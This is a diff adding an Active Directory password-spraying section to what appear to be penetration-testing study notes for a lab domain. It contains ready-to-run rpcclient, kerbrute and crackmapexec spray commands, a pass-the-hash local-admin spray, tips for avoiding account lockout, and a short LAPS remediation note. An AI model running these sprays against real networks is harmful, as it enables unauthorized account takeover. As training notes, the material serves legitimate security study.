@@ -232,6 +232,39 @@ net accounts
 import-module .\PowerView.ps1
 Get-DomainPolicy
 ```
+
+### Performing the spray
+#### AD - RPC - rpcclient
+```bash
+for u in $(cat [users]);do rpcclient -U "$u%[password]" -c "getusername;quit" [ip] | grep Authority; done
+```
+> This attempts to spray using rpcclient, then checks if a user has an `Authority Name` to determine if its a real login or not
+
+#### AD - Kerberos - Kerbrute
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc [dc-ip] [users] [password]
+```
+
+#### AD - SMB - Crackmapexec
+```bash
+sudo crackmapexec smb [ip] -u [users] -p [password] | grep +
+```
+> The grep here means we ignore any login failures (prefix: `[*]`) as success cases are prefixed with `[+]`
+
+### Local Administrator Password Reuse
+It is common (often because of gold images used for automated deployments) that passwords are re-used for administrator accounts. This is also true for users that have both a standard domain user & administrator account. Often people are lazy and will reuse their passwords.
+
+This could also apply if we find a user's password in *Domain A*, and then find the same (or similar) account name in *Domain B*. Allowing us to traverse domains easily
+
+#### Remediation
+The free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) can be used to have AD manage local administrator passwords, enforcing unique passwords on each host that rotate on a set interval.
+
+### Spraying windows local admins with an NTLM Hash
+```bash
+sudo crackmapexec smb --local-auth [subnet] -u administrator -H [hash] | grep +
+```
+> `--local-auth` means that we only attempt to login once on each machine, this avoids us LOCKING OUT USERS. Without this, the tool will attempt to authenticate via the domain, not the machine, which would quickly cause a lockout.
+
 ## Windows
 
 ### Attacking SAM
